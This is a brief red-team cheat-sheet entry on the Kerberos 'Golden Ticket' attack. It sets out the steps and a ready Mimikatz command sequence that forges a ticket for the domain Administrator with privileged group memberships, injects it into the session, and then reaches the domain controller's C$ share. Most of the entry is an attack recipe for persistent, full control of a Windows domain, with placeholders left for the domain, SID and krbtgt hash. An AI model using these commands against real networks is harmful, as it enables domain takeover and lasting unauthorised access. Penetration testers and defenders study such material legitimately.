# 17.03 Golden Ticket

> Forge a TGT for any user and group with the `krbtgt` key plus domain SID — persists until `krbtgt` is rotated twice.

## Overview

With the krbtgt NT/AES key + domain SID, forge a TGT for any user with any group membership. Persistence until krbtgt is rotated twice.

## Steps

- **Need krbtgt hash + domain SID + DC name**.
- **Mimikatz kerberos::golden /user:Administrator /id:500 /groups:512,...**
- **Inject + use** — kerberos::ptt, then access anything.

## Commands

### Golden

```cmd
kerberos::purge
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /krbtgt:<NT> /id:500 /groups:512,513,518,519,520 /ptt
dir \\\\<DC>\\C$
```
